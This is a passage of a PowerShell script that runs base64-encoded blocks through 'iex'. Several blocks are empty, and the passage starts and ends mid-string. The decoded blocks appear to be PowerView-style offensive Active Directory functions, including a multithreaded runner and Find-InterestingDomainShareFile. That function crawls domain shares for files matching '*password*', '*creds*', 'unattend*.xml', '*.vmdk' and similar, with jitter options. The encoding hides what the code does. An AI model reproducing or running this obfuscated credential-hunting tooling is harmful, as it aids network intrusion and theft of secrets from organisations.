ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRMYXN0V3JpdGVUaW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRDcmVhdGlvblRpbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ09mZmljZURvY3MnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRPZmZpY2VEb2NzLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGcmVzaEVYRXMnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGcmVzaEVYRXMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUZvbGRlcnMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUhpZGRlbiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja1dyaXRlQWNjZXNzLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9ICBAewogICAgICAgICAgICAnUmVjdXJzZScgPSAkVHJ1ZQogICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1NpbGVudGx5Q29udGludWUnCiAgICAgICAgICAgICdJbmNsdWRlJyA9ICRJbmNsdWRlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ09mZmljZURvY3MnXSkgewogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0luY2x1ZGUnXSA9IEAoJyouZG9jJywgJyouZG9jeCcsICcqLnhscycsICcqLnhsc3gnLCAnKi5wcHQnLCAnKi5wcHR4JykKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZyZXNoRVhFcyddKSB7CiAgICAgICAgICAgICRMYXN0QWNjZXNzVGltZSA9IChHZXQtRGF0ZSkuQWRkRGF5cygtNykuVG9TdHJpbmcoJ01NL2RkL3l5eXknKQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0luY2x1ZGUnXSA9IEAoJyouZXhlJykKICAgICAgICB9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydGb3JjZSddID0gLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0V4Y2x1ZGVIaWRkZW4nXQogICAgICAgICRNYXBwZWRDb21wdXRlcnMgPSBAe30KICAgICAgICBmdW5jdGlvbiBUZXN0LVdyaXRlIHsKICAgICAgICAgICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbShbU3RyaW5nXSRQYXRoKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZpbGV0ZXN0ID0gW0lPLkZpbGVdOjpPcGVuV3JpdGUoJFBhdGgpCiAgICAgICAgICAgICAgICAkRmlsZXRlc3QuQ2xvc2UoKQogICAgICAgICAgICAgICAgJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAkRmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRoKSB7CiAgICAgICAgICAgIGlmICgoJFRhcmdldFBhdGggLU1hdGNoICdcXFxcLipcXC4qJykgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pKSB7CiAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0pIHsKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRIb3N0Q29tcHV0ZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1BhdGgnXSA9ICRUYXJnZXRQYXRoCiAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJENvbnRpbnVlID0gJFRydWUKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0V4Y2x1ZGVGb2xkZXJzJ10gLWFuZCAoJF8uUFNJc0NvbnRhaW5lcikpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGNsdWRpbmc6ICQoJF8uRnVsbE5hbWUpIgogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRMYXN0QWNjZXNzVGltZSAtYW5kICgkXy5MYXN0QWNjZXNzVGltZSAtbHQgJExhc3RBY2Nlc3NUaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTGFzdFdyaXRlVGltZSddIC1hbmQgKCRfLkxhc3RXcml0ZVRpbWUgLWx0ICRMYXN0V3JpdGVUaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlYXRpb25UaW1lJ10gLWFuZCAoJF8uQ3JlYXRpb25UaW1lIC1sdCAkQ3JlYXRpb25UaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ2hlY2tXcml0ZUFjY2VzcyddIC1hbmQgKC1ub3QgKFRlc3QtV3JpdGUgLVBhdGggJF8uRnVsbE5hbWUpKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRDb250aW51ZSkgewogICAgICAgICAgICAgICAgICAgICRGaWxlUGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1BhdGgnID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ093bmVyJyA9ICQoKEdldC1BY2wgJF8uRnVsbE5hbWUpLk93bmVyKQogICAgICAgICAgICAgICAgICAgICAgICAnTGFzdEFjY2Vzc1RpbWUnID0gJF8uTGFzdEFjY2Vzc1RpbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0xhc3RXcml0ZVRpbWUnID0gJF8uTGFzdFdyaXRlVGltZQogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRpb25UaW1lJyA9ICRfLkNyZWF0aW9uVGltZQogICAgICAgICAgICAgICAgICAgICAgICAnTGVuZ3RoJyA9ICRfLkxlbmd0aAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRm91bmRGaWxlID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRGaWxlUGFyYW1zCiAgICAgICAgICAgICAgICAgICAgJEZvdW5kRmlsZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRm91bmRGaWxlJykKICAgICAgICAgICAgICAgICAgICAkRm91bmRGaWxlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgICRNYXBwZWRDb21wdXRlcnMuS2V5cyB8IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LVRocmVhZGVkRnVuY3Rpb24gewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uU2NyaXB0QmxvY2tdCiAgICAgICAgJFNjcmlwdEJsb2NrLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTY3JpcHRQYXJhbWV0ZXJzLAogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICROb0ltcG9ydHMKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2Vzc2lvblN0YXRlID0gW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzLkluaXRpYWxTZXNzaW9uU3RhdGVdOjpDcmVhdGVEZWZhdWx0KCkKICAgICAgICAkU2Vzc2lvblN0YXRlLkFwYXJ0bWVudFN0YXRlID0gW1N5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGVdOjpTVEEKICAgICAgICBpZiAoLW5vdCAkTm9JbXBvcnRzKSB7CiAgICAgICAgICAgICRNeVZhcnMgPSBHZXQtVmFyaWFibGUgLVNjb3BlIDIKICAgICAgICAgICAgJFZvcmJpZGRlblZhcnMgPSBAKCc/JywnYXJncycsJ0NvbnNvbGVGaWxlTmFtZScsJ0Vycm9yJywnRXhlY3V0aW9uQ29udGV4dCcsJ2ZhbHNlJywnSE9NRScsJ0hvc3QnLCdpbnB1dCcsJ0lucHV0T2JqZWN0JywnTWF4aW11bUFsaWFzQ291bnQnLCdNYXhpbXVtRHJpdmVDb3VudCcsJ01heGltdW1FcnJvckNvdW50JywnTWF4aW11bUZ1bmN0aW9uQ291bnQnLCdNYXhpbXVtSGlzdG9yeUNvdW50JywnTWF4aW11bVZhcmlhYmxlQ291bnQnLCdNeUludm9jYXRpb24nLCdudWxsJywnUElEJywnUFNCb3VuZFBhcmFtZXRlcnMnLCdQU0NvbW1hbmRQYXRoJywnUFNDdWx0dXJlJywnUFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVzJywnUFNIT01FJywnUFNTY3JpcHRSb290JywnUFNVSUN1bHR1cmUnLCdQU1ZlcnNpb25UYWJsZScsJ1BXRCcsJ1NoZWxsSWQnLCdTeW5jaHJvbml6ZWRIYXNoJywndHJ1ZScpCiAgICAgICAgICAgIEZvckVhY2ggKCRWYXIgaW4gJE15VmFycykgewogICAgICAgICAgICAgICAgaWYgKCRWb3JiaWRkZW5WYXJzIC1Ob3RDb250YWlucyAkVmFyLk5hbWUpIHsKICAgICAgICAgICAgICAgICRTZXNzaW9uU3RhdGUuVmFyaWFibGVzLkFkZCgoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuU2Vzc2lvblN0YXRlVmFyaWFibGVFbnRyeSAtQXJndW1lbnRMaXN0ICRWYXIubmFtZSwkVmFyLlZhbHVlLCRWYXIuZGVzY3JpcHRpb24sJFZhci5vcHRpb25zLCRWYXIuYXR0cmlidXRlcykpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCAoJEZ1bmN0aW9uIGluIChHZXQtQ2hpbGRJdGVtIEZ1bmN0aW9uOikpIHsKICAgICAgICAgICAgICAgICRTZXNzaW9uU3RhdGUuQ29tbWFuZHMuQWRkKChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5TZXNzaW9uU3RhdGVGdW5jdGlvbkVudHJ5IC1Bcmd1bWVudExpc3QgJEZ1bmN0aW9uLk5hbWUsICRGdW5jdGlvbi5EZWZpbml0aW9uKSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkUG9vbCA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZVBvb2woMSwgJFRocmVhZHMsICRTZXNzaW9uU3RhdGUsICRIb3N0KQogICAgICAgICRQb29sLk9wZW4oKQogICAgICAgICRNZXRob2QgPSAkTnVsbAogICAgICAgIEZvckVhY2ggKCRNIGluIFtQb3dlclNoZWxsXS5HZXRNZXRob2RzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1lcSAnQmVnaW5JbnZva2UnIH0pIHsKICAgICAgICAgICAgJE1ldGhvZFBhcmFtZXRlcnMgPSAkTS5HZXRQYXJhbWV0ZXJzKCkKICAgICAgICAgICAgaWYgKCgkTWV0aG9kUGFyYW1ldGVycy5Db3VudCAtZXEgMikgLWFuZCAkTWV0aG9kUGFyYW1ldGVyc1swXS5OYW1lIC1lcSAnaW5wdXQnIC1hbmQgJE1ldGhvZFBhcmFtZXRlcnNbMV0uTmFtZSAtZXEgJ291dHB1dCcpIHsKICAgICAgICAgICAgICAgICRNZXRob2QgPSAkTS5NYWtlR2VuZXJpY01ldGhvZChbT2JqZWN0XSwgW09iamVjdF0pCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRKb2JzID0gQCgpCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRDb21wdXRlck5hbWUgfCBXaGVyZS1PYmplY3QgeyRfIC1hbmQgJF8uVHJpbSgpfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRDb21wdXRlck5hbWUuY291bnQpIgogICAgICAgIGlmICgkVGhyZWFkcyAtZ2UgJENvbXB1dGVyTmFtZS5MZW5ndGgpIHsKICAgICAgICAgICAgJFRocmVhZHMgPSAkQ29tcHV0ZXJOYW1lLkxlbmd0aAogICAgICAgIH0KICAgICAgICAkRWxlbWVudFNwbGl0U2l6ZSA9IFtJbnRdKCRDb21wdXRlck5hbWUuTGVuZ3RoLyRUaHJlYWRzKQogICAgICAgICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCA9IEAoKQogICAgICAgICRTdGFydCA9IDAKICAgICAgICAkRW5kID0gJEVsZW1lbnRTcGxpdFNpemUKICAgICAgICBmb3IoJGkgPSAxOyAkaSAtbGUgJFRocmVhZHM7ICRpKyspIHsKICAgICAgICAgICAgJExpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICAgICAgICAgaWYgKCRpIC1lcSAkVGhyZWFkcykgewogICAgICAgICAgICAgICAgJEVuZCA9ICRDb21wdXRlck5hbWUuTGVuZ3RoCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJExpc3QuQWRkUmFuZ2UoJENvbXB1dGVyTmFtZVskU3RhcnQuLigkRW5kLTEpXSkKICAgICAgICAgICAgJFN0YXJ0ICs9ICRFbGVtZW50U3BsaXRTaXplCiAgICAgICAgICAgICRFbmQgKz0gJEVsZW1lbnRTcGxpdFNpemUKICAgICAgICAgICAgJENvbXB1dGVyTmFtZVBhcnRpdGlvbmVkICs9IEAoLEAoJExpc3QuVG9BcnJheSgpKSkKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgdGhyZWFkcy9wYXJ0aXRpb25zOiAkVGhyZWFkcyIKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXJOYW1lUGFydGl0aW9uIGluICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCkgewogICAgICAgICAgICAkUG93ZXJTaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgICAgICAgICAgJFBvd2VyU2hlbGwucnVuc3BhY2Vwb29sID0gJFBvb2wKICAgICAgICAgICAgJE51bGwgPSAkUG93ZXJTaGVsbC5BZGRTY3JpcHQoJFNjcmlwdEJsb2NrKS5BZGRQYXJhbWV0ZXIoJ0NvbXB1dGVyTmFtZScsICRDb21wdXRlck5hbWVQYXJ0aXRpb24pCiAgICAgICAgICAgIGlmICgkU2NyaXB0UGFyYW1ldGVycykgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFBhcmFtIGluICRTY3JpcHRQYXJhbWV0ZXJzLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgICAgICROdWxsID0gJFBvd2VyU2hlbGwuQWRkUGFyYW1ldGVyKCRQYXJhbS5OYW1lLCAkUGFyYW0uVmFsdWUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTRGF0YUNvbGxlY3Rpb25bT2JqZWN0XQogICAgICAgICAgICAkSm9icyArPSBAewogICAgICAgICAgICAgICAgUFMgPSAkUG93ZXJTaGVsbAogICAgICAgICAgICAgICAgT3V0cHV0ID0gJE91dHB1dAogICAgICAgICAgICAgICAgUmVzdWx0ID0gJE1ldGhvZC5JbnZva2UoJFBvd2VyU2hlbGwsIEAoJE51bGwsIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNEYXRhQ29sbGVjdGlvbltPYmplY3RdXSRPdXRwdXQpKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIFRocmVhZHMgZXhlY3V0aW5nIgogICAgICAgIERvIHsKICAgICAgICAgICAgRm9yRWFjaCAoJEpvYiBpbiAkSm9icykgewogICAgICAgICAgICAgICAgJEpvYi5PdXRwdXQuUmVhZEFsbCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMQogICAgICAgIH0KICAgICAgICBXaGlsZSAoKCRKb2JzIHwgV2hlcmUtT2JqZWN0IHsgLW5vdCAkXy5SZXN1bHQuSXNDb21wbGV0ZWQgfSkuQ291bnQgLWd0IDApCiAgICAgICAgJFNsZWVwU2Vjb25kcyA9IDEwMAogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gV2FpdGluZyAkU2xlZXBTZWNvbmRzIHNlY29uZHMgZm9yIGZpbmFsIGNsZWFudXAuLi4iCiAgICAgICAgZm9yICgkaT0wOyAkaSAtbHQgJFNsZWVwU2Vjb25kczsgJGkrKykgewogICAgICAgICAgICBGb3JFYWNoICgkSm9iIGluICRKb2JzKSB7CiAgICAgICAgICAgICAgICAkSm9iLk91dHB1dC5SZWFkQWxsKCkKICAgICAgICAgICAgICAgICRKb2IuUFMuRGlzcG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVMgMQogICAgICAgIH0KICAgICAgICAkUG9vbC5EaXNwb3NlKCkKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIGFsbCB0aHJlYWRzIGNvbXBsZXRlZCIKICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZSB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3VuZEZpbGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckRvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnT3BlcmF0aW5nU3lzdGVtJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZWFyY2hUZXJtcycsICdUZXJtcycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSW5jbHVkZSA9IEAoJypwYXNzd29yZConLCAnKnNlbnNpdGl2ZSonLCAnKmFkbWluKicsICcqbG9naW4qJywgJypzZWNyZXQqJywgJ3VuYXR0ZW5kKi54bWwnLCAnKi52bWRrJywgJypjcmVkcyonLCAnKmNyZWRlbnRpYWwqJywgJyouY29uZmlnJyksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdcXFxcJyldCiAgICAgICAgW0FsaWFzKCdTaGFyZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkU2hhcmVQYXRoLAogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkRXhjbHVkZWRTaGFyZXMgPSBAKCdDJCcsICdBZG1pbiQnLCAnUHJpbnQkJywgJ0lQQyQnKSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkTGFzdEFjY2Vzc1RpbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RXcml0ZVRpbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJENyZWF0aW9uVGltZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnT2ZmaWNlRG9jcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE9mZmljZURvY3MsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZyZXNoRVhFcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZyZXNoRVhFcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0